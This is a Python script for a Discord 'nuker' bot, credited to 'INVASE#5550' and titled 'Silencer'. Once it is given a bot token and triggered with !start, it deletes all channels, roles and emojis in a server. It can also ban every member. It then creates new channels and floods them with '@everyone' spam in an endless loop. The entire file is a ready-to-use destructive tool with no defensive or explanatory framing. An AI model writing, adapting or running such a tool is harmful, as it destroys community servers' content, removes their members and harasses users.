import discord
from discord.ext import commands
import random
from discord import Permissions
import time
import asyncio

from colorama import Fore, Back, Style, init

init(convert=True)
import ctypes

token = ""

CHANNEL_NAME = "Nuked"
SPAM_MESSAGE = "GET NUKED @everyone"
BAN_REASON = "none"
BAN = False
client = commands.Bot(command_prefix="!")

print(f''' 

─██████████████─██████████─██████─────────██████████████─██████──────────██████─██████████████─██████████████─████████████████───
─██░░░░░░░░░░██─██░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░██████████──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██░░██████████─████░░████─██░░██─────────██░░██████████─██░░░░░░░░░░██──██░░██─██░░██████████─██░░██████████─██░░████████░░██───
─██░░██───────────██░░██───██░░██─────────██░░██─────────██░░██████░░██──██░░██─██░░██─────────██░░██─────────██░░██────██░░██───
─██░░██████████───██░░██───██░░██─────────██░░██████████─██░░██──██░░██──██░░██─██░░██─────────██░░██████████─██░░████████░░██───
─██░░░░░░░░░░██───██░░██───██░░██─────────██░░░░░░░░░░██─██░░██──██░░██──██░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██████████░░██───██░░██───██░░██─────────██░░██████████─██░░██──██░░██──██░░██─██░░██─────────██░░██████████─██░░██████░░████───
─────────██░░██───██░░██───██░░██─────────██░░██─────────██░░██──██░░██████░░██─██░░██─────────██░░██─────────██░░██──██░░██─────
─██████████░░██─████░░████─██░░██████████─██░░██████████─██░░██──██░░░░░░░░░░██─██░░██████████─██░░██████████─██░░██──██░░██████─
─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██████████░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
─██████████████─██████████─██████████████─██████████████─██████──────────██████─██████████████─██████████████─██████──██████████─
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


        {Fore.LIGHTGREEN_EX}MADE BY INVASE#5550

 ''')
ctypes.windll.kernel32.SetConsoleTitleW("Silencer")
time.sleep(4)
amount = 1
while True:

    print(f"""
    
    {Fore.MAGENTA}
    [0] Set Token (Mandatory)
    [1] Set Channel name
    [2] Set Spam message
    [3] Set Ban reason
    [4] Ban ({str(BAN)})
    [5] Amount of channels
    
    [6] Begin
    
    {Fore.LIGHTGREEN_EX}PLEASE REMEMBER TO SET YOUR TOKEN.{Fore.MAGENTA}
    """)
    command = input(">")
    if command == "1":
        j = input("Name:\n")
        CHANNEL_NAME = j
    elif command == "2":
        k = input("Message:\n")
        SPAM_MESSAGE = k
    elif command == "3":
        h = input("Reason:\n")
        BAN_REASON = h
    elif command == "4":
        if BAN == True:
            print("Toggled BAN to FALSE!")
            BAN = False
        else:
            print("Toggled BAN to TRUE!")
            BAN = True
    elif command == "5":
        hj = input("Amount:\n")
        amount = hj
    elif command == "6":
        print(f"{Fore.GREEN} Starting...")
        break
    elif command == "0":

        h = input("Token:\n")
        token = h

print(f'{Fore.LIGHTYELLOW_EX}Use "!start" to start nuking! ')


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="Pycharm Community Edition"))


@client.command()
async def start(ctx):
    print(f"{Fore.LIGHTGREEN_EX}Received command. beginning")
    guild = ctx.guild
    time.sleep(1)
    print(f"{Fore.GREEN}Logged into the bot...")
    time.sleep(0.5)
    print(f"{Fore.LIGHTBLUE_EX} Deleting channels...")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.LIGHTBLUE_EX}Deleted {channel.name}!")
        except:
            print(f"{Fore.RED}Could not delete {channel.name}.")
    for member in guild.members:

        if BAN == True:
            time.sleep(0.15)

            try:
                await member.ban(reason=BAN_REASON)
                print(f"{Fore.CYAN} {member.name}#{member.discriminator} was banned.")
            except:
                print("Unable to ban " + member.name)
    print(f"{Fore.GREEN}Deleting all roles...")
    for role in guild.roles:
        try:
            await role.delete()
            print(f"{Fore.GREEN} Deleted {role.name}!")
        except:
            print(f"{Fore.RED}Error while deleting {role.name}!")
    print(f"{Fore.CYAN}Deleting all server assets...")
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.CYAN}Deleted {emoji.name}!")
        except:
            print(f"{Fore.RED} Could not delete {emoji.name}.")
    banned_users = await guild.bans()
    print("Users banned:\n")
    if len(banned_users) == 0:
        print(f"{Fore.RED}No users banned!")
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            print(f"{Fore.LIGHTYELLOW_EX}{user.name}")
        except:
            print(f"{Fore.YELLOW}UNKNOWN")

    for i in range(int(amount)):
        time.sleep(0.5)
        await guild.create_text_channel(CHANNEL_NAME)
    print(f"{Fore.CYAN}Nuking successful!")
    time.sleep(0.5)
    print(f"{Fore.RED}Exit out of the program when you want the bot to stop sending messages!")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(SPAM_MESSAGE)
        time.sleep(1)


try:
    client.run(token, bot=True)
except:
    print("ERROR WHILE RUNNING BOT")
